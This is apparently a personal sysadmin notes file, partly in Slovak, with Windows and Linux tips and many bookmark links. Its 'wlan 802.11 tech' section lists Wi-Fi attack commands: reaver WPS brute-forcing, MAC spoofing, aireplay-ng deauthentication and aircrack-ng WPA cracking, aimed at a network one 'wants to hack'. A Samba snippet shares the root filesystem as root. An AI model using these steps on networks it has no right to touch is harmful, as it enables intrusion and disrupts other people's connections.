# Remove Edge browser from Win10
cd C:\Program Files (x86)\Microsoft\Edge\Application\83.0.478.61\Installer 

setup.exe --uninstall --system-level --verbose-logging --force-uninstall 

# Disable Hiberfil.sys (Win10)
Klikni na start, napis cmd a klikni nan pravym a spusti ho ako spravca. V nom potom zadaj powercfg -h off tym za zbavis hiberfil.sys

# Mount vbox shared folder on linux
Do not do: mount -t vboxsf -o uid=1000,gid=1000 VMs-shared /mnt
- /mnt remains empty

If I try to do this after: root@fhsw-web:/mnt# mount -t vboxsf -o uid=1000,gid=1000 VMs-shared /mnt/VMs-shared
It will throw: mount: /mnt/VMs-shared: mount point does not exist.

Check current mounts: root@fhsw-web:/mnt# mount
Try to unmount: root@fhsw-web:/# umount VMs-shared
Throws: /mnt: target is busy.
Need to exit that folder: root@fhsw-web:/mnt# cd ..

Repeat: root@fhsw-web:/# umount VMs-shared

Do properly: root@fhsw-web:/# mount -t vboxsf -o uid=1000,gid=1000 VMs-shared /mnt/VMs-shared


# Install .deb file with dpkg
sudo dpkg -i ~/Downloads/*.deb

# Make root prompt red
""" PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ' """

http://www.mogilowski.net/lang/en-us/2011/12/29/color-bash-prompt-on-ubuntu-and-debian/
Edit ”/root/.bashrc” and change ”force_color_prompt=yes” like for your user

#Linux root password recovery
- Boot into recovery mode (via advanced options in GRUB)
- select root
- type the normal password
- mount -rw -o remount /
root@ubuntu:~# passwd jorge
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
root@ubuntu:~# reboot

Normal login.

http://askubuntu.com/questions/24006/how-do-i-reset-a-lost-administrative-password





# Links 
https://www.linkedin.com/pulse/network-automation-via-python-mostafa-hassan
https://pynet.twb-tech.com
https://pynet.twb-tech.com/blog/automation/napalm-ios.html


https://www.google.co.uk/search?client=opera&hs=dM4&biw=1560&bih=790&tbm=isch&sa=1&ei=QvF1WriYKIbUgQbv74igCQ&q=netowrk+python&oq=netowrk+python&gs_l=psy-ab.3..0i19k1j0i13i5i30i19k1j0i8i13i30i19k1l2.16384.17224.0.17348.8.8.0.0.0.0.159.777.6j2.8.0....0...1c.1.64.psy-ab..2.5.484...0i13k1j0i13i10k1j0i7i30i19k1j0i8i7i30i19k1j0i13i30i19k1.0.A2SZpWcirfo#imgrc=jDqm-y1YzMHKWM:

https://www.youtube.com/watch?v=IhroIrV9_7w

http://packetpushers.net/intro-python-network-automation/

https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

https://unix.stackexchange.com/questions/92715/can-i-transfer-files-using-ssh

https://openvpn.net/index.php/open-source/documentation/howto.html

https://ubuntuforums.org/showthread.php?t=1755566

https://www.google.co.uk/search?q=ufw+vs+iptables&ie=utf-8&oe=utf-8&client=firefox-b-ab&gfe_rd=cr&ei=nNw3WfqkGerGXpKaqZgE


https://www.howtoforge.com/tutorial/clamav-ubuntu/
https://askubuntu.com/questions/909273/clamav-error-var-log-clamav-freshclam-log-is-locked-by-another-process
https://www.youtube.com/watch?v=SQBJySjjTXQ
https://www.youtube.com/watch?v=9h3q5ss40oY
https://www.youtube.com/watch?v=ag7GZZxTkxQ
https://www.clamav.net/documents/installing-clamav#debian
https://www.pcworld.com/article/208720/how_to_fix_a_windows_infection_using_linux.html
https://www.google.com/search?client=ubuntu&hs=kce&channel=fs&ei=Ys04W82wNcTDgAbb7qVI&q=remove+virus+from+windows+using+linux&oq=remove+virus+from+windows+using+linux&gs_l=psy-ab.3..0i22i30k1l3.1708.2896.0.3042.12.11.0.0.0.0.191.1367.0j10.10.0....0...1.1.64.psy-ab..2.10.1361...0j0i67k1.0.yAToOXnLuhM

https://stackoverflow.com/questions/46768708/window-server-2008-generate-certificate-with-subject-alternative-name
https://serverfault.com/questions/605843/unable-to-generate-certificate-with-subject-alternate-name-using-java-1-7-keytoo
https://www.google.co.uk/search?q=generatecertificate+with+subject&ie=utf-8&oe=utf-8&client=ubuntu&channel=fs&gfe_rd=cr&dcr=0&ei=yiQtWtrYD4uBtgfaxKjoCA
https://datacenteroverlords.com/2012/03/01/creating-your-own-ssl-certificate-authority/
https://www.google.co.uk/search?q=generate+ca+certificate&ie=utf-8&oe=utf-8&client=ubuntu&channel=fs&gfe_rd=cr&dcr=0&ei=jCQtWt2tGYuBtgfaxKjoCA&gws_rd=ssl

www.telegraph.co.uk/education/stem-awards/
https://www.tutorialspoint.com/digital_communication/digital_communication_phase_shift_keying.htm
https://www.tutorialspoint.com/digital_communication/digital_communication_amplitude_shift_keying.htm
https://www.youtube.com/watch?v=euMk8buSWOs
https://www.youtube.com/watch?v=VI0nVHd1_P4
https://www.youtube.com/watch?v=p_shhU_H5Z0
https://www.youtube.com/watch?v=d5p_U8J0iRQ
https://en.wikipedia.org/wiki/Adaptive_Huffman_coding
https://www.gnu.org/software/gdb/
http://www.data-compression.com/lossless.html#huff
https://www.google.co.uk/search?q=huffman+simple&client=ubuntu&hs=00T&channel=fs&dcr=0&source=lnms&tbm=isch&sa=X&ved=0ahUKEwj5mb_J4JXXAhVaOMAKHdLPBJgQ_AUICigB&biw=1064&bih=710
https://www.youtube.com/watch?v=iiGZ947Tcck

https://news.ycombinator.com/item?id=12050360
https://www.cisco.com/c/en/us/about/press/internet-protocol-journal/back-issues/table-contents-19/switch-evolution.html
https://en.wikipedia.org/wiki/Virtual_LAN
https://en.wikipedia.org/wiki/Cross-correlation

https://askubuntu.com/questions/770522/is-it-possible-to-control-app-volume-from-taskbar
https://arxiv.org/pdf/1310.0757.pdf
https://askubuntu.com/questions/449364/what-does-without-password-mean-in-sshd-config-file
https://www.howtoforge.com/community/threads/debian-vi-vim-color-syntax.13715/
https://docs.nexcess.net/article/how-to-change-ssh-passwords-from-the-cli.html
https://wiki.debian.org/DebianFirewall
https://wiki.debian.org/iptables
http://forums.justlinux.com/showthread.php?70876-iptables-basics
https://www.linuxquestions.org/questions/linux-security-4/failed-ssh-login-attempts-340366/?perpage=15
https://www.linuxquestions.org/questions/linux-security-4/ssh-tricks-any-way-to-block-failed-attempts-by-ip-address-342359/
https://www.bitvise.com/getting-started-hardening-ssh-server
https://www.google.co.uk/search?q=blacklist+ssh&ie=utf-8&oe=utf-8&client=ubuntu&channel=fs&gfe_rd=cr&ei=hPmbWa6mDcPU8gfE3J2gCA&gws_rd=ssl
https://security.stackexchange.com/questions/21027/invalid-users-trying-to-log-in-to-my-server
https://www.raspberrypi.org/documentation/linux/usage/users.md
https://www.google.co.uk/search?client=ubuntu&hs=m67&channel=fs&q=pi+password&oq=pi+password&gs_l=psy-ab.3..0l4.1351.2187.0.2292.8.8.0.0.0.0.149.747.5j3.8.0....0...1.1.64.psy-ab..0.8.744...0i67k1j0i10k1.CamM5WhfYAU
https://lists.blocklist.de/lists/ssh.txt
http://www.blocklist.de/en/index.html
https://raspberrypi.stackexchange.com/questions/29399/strange-ip-connected-to-ssh
https://www.google.co.uk/search?q=whats+my+ip&ie=utf-8&oe=utf-8&client=ubuntu&channel=fs&gfe_rd=cr&ei=FNebWbPwCO3R8gfvgJq4Aw&gws_rd=ssl
https://stackoverflow.com/questions/15190391/ssh-directory-not-being-created
https://wiki.ubuntu.com/SystemdForUpstartUsers
https://askubuntu.com/questions/654951/failed-to-connect-to-socket-com-ubuntu-upstart-connection-refused-errors-were
https://bugs.kde.org/show_bug.cgi?id=339866
https://askubuntu.com/questions/307/how-can-ppas-be-removed
https://en.wikipedia.org/wiki/FreeBSD
https://en.wikipedia.org/wiki/PfSense
http://www.dslreports.com/forum/r31134636-Routers-PfSense-or-EdgeRouter
http://www.dslreports.com/forum/network
https://stackoverflow.com/questions/7005713/how-to-compile-a-c-program-in-linux
https://askubuntu.com/questions/61408/what-is-a-command-to-compile-and-run-c-programs
www.tecmint.com/best-linux-ide-editors-source-code-editors/
http://xmodulo.com/good-ide-for-c-cpp-linux.html
https://stackoverflow.com/questions/24109/c-ide-for-linux
www.alexeyshmalko.com/2014/using-vim-as-c-cpp-ide/
vim.wikia.com/wiki/Open_vimrc_file


https://www.thelocal.ch/20170209/why-nows-the-time-to-buy-a-home-in-switzerland
https://www.deezer.com/us/album/40007901
https://www.integral-calculator.com/
https://math.stackexchange.com/questions/536052/whats-the-integral-of-a-constant

# Free BSD stuff
https://www.freebsd.org/doc/handbook/users-synopsis.html
https://www.freebsd.org/doc/en_US.ISO8859-1/articles/new-users/adding-a-user.html
https://www.unixmen.com/freebsd-vs-openbsd/
https://www.freebsd.org/doc/handbook/bsdinstall-post.html
https://serverfault.com/questions/58363/my-unqualified-host-name-foo-bar-unknown-problem
https://www.freebsd.org/doc/en_US.ISO8859-1/articles/linux-users/shells.html
https://www.freebsd.org/doc/en_US.ISO8859-1/articles/linux-users/article.html
https://www.freebsd.org/doc/handbook/shells.html
https://www.cyberciti.biz/faq/freebsd-bash-installation/
https://www.cyberciti.biz/faq/freebsd-install-sudo-command/
https://www.disk-partition.com/gpt-mbr/mbr-vs-gpt-1004.html


# Notepad alternatives for Linux
https://itsfoss.com/notepad-alternatives-for-linux/

###Notepadqq
sudo add-apt-repository ppa:notepadqq-team/notepadqq
sudo apt-get update
sudo apt-get install notepadqq

###Geany 
sudo apt-get install geany scite

###Sublime
sudo add-apt-repository ppa:webupd8team/sublime-text-2
sudo apt-get update
sudo apt-get install sublime-text

# Correction of Share already in use 
The network folder specified is currently mapped using a different user name and password", when trying to connect to a drive remotely

net use /delete \\server\share


# Samba sharing root folder
[root$]
path = /
create mask = 0755
force user = root
browsable = yes

# IRC client
https://irssi.org/download/

# Janciho stary github
https://github.com/yafw/curses-vbox-manager

# wlan 802.11 tech
airmon-ng start wlan0
airodump-ng wlan0
vyberes bssid toho coho chces hacknut
airodump-ng -c tocojepodpismenomCH --bssid bssid mon0
to mas na to ked chces zhadzovat konkretne zariadenia
ked mas zkopirovane to bssid
reaver -i mon0 -b bssid -vv -c topodCH

Z wordlistu....heslo musi byt len slovo: 
http://www.youtube.com/watch?v=AlE6U3iQMTk
1) airmon-ng start wlan0
2) ifconfig mon0 down
3) macchanger -r mon0
4) ifconfig mon0 up
5) airodump-ng mon0
6) airodump-ng -c 5 -w WPACRACK --bssid FF:17:6A:EA:70:FF --ivs mon0
7) aireplay-ng -0 100 -e testwlan mon0
8) aircrack-ng -w /usr/share/wordlists/rockyou.txt WPACRACK-01.ivs

If aireplay-ng say that the channel is not correct
1) ifconfig mon0 down
2) iwconfig mon0 channel 6
3) ifconfig mon0 up


https://www.lifewire.com/wireless-standards-802-11a-802-11b-g-n-and-802-11ac-816553
http://blog.gauravkansal.in/2016/10/analysis-of-igi-airport-wi-fi-setup.html

http://www.stanstedairport.com/at-the-airport/services-and-facilities/internet-access/

https://www.cisco.com/c/en/us/products/wireless/access-points/index.html#~stickynav=2
https://www.cisco.com/c/en/us/products/wireless/access-points/compare-indoor-access-points.html

https://www.google.co.uk/search?client=firefox-b&dcr=0&ei=mFpbWrapN8zZgAbbr5eQDA&q=how+to+deploy+airport+wifi&oq=how+to+deploy+airport+wifi&gs_l=psy-ab.3..0i22i30k1l2.13139.17308.0.17465.26.16.0.2.2.0.369.2097.5j8j1j1.15.0....0...1c.1.64.psy-ab..10.16.1769...0j0i19k1j0i22i10i30i19k1j0i22i30i19k1.0.NvGNaaZ6Lns

https://www.google.co.uk/search?q=cisco+b%2Fg%2Fn+AP&ie=utf-8&oe=utf-8&client=firefox-b-ab&gfe_rd=cr&dcr=0&ei=zGVbWsnxDK-Gtgfi95PoCw

https://supportforums.cisco.com/t5/other-wireless-mobility-subjects/802-11b-g-n-operational-status-down-for-mesh-ap-1522e/td-p/2296774

